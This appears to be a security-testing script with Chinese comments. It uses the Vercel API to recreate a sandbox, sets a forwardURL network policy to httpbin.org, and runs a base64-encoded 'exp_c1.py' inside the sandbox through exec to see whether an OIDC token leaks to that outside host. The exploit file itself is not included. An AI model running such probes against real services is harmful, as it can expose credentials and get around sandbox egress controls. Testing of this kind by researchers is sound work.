# 本地流程: 创建沙箱 -> update policy(allow风格 forwardURL) -> 沙箱内请求 httpbin.org
# 验证 forwardURL 转发 + OIDC token 是否出现在响应中
import json, base64, pathlib, urllib.request, urllib.error

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]

NAME = "expc1"
# 1. 删除旧沙箱
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
# 2. 创建
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
d = json.loads(r)
sid = d["sandbox"]["currentSessionId"]
print("sid:", sid)

# 3. update policy: allow 风格 + forwardURL
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"httpbin.org": [{"forwardURL": "https://httpbin.org/anything"}]}})
print("update forwardURL:", c, r[:200])

# 4. 执行沙箱内脚本
payload = base64.b64encode(pathlib.Path("exp_c1.py").read_bytes()).decode()
body = {"command": "python3", "args": ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"],
        "wait": True, "logs": True, "timeout": 60000}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("cmd:", c)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d2 = json.loads(line)
        if d2.get("stream") in ("stdout", "stderr"):
            print(d2.get("data", ""), end="")
        elif d2.get("stream") == "command":
            print("\nEXIT:", d2.get("command", {}).get("exitCode"))
    except Exception:
        print(line[:300])
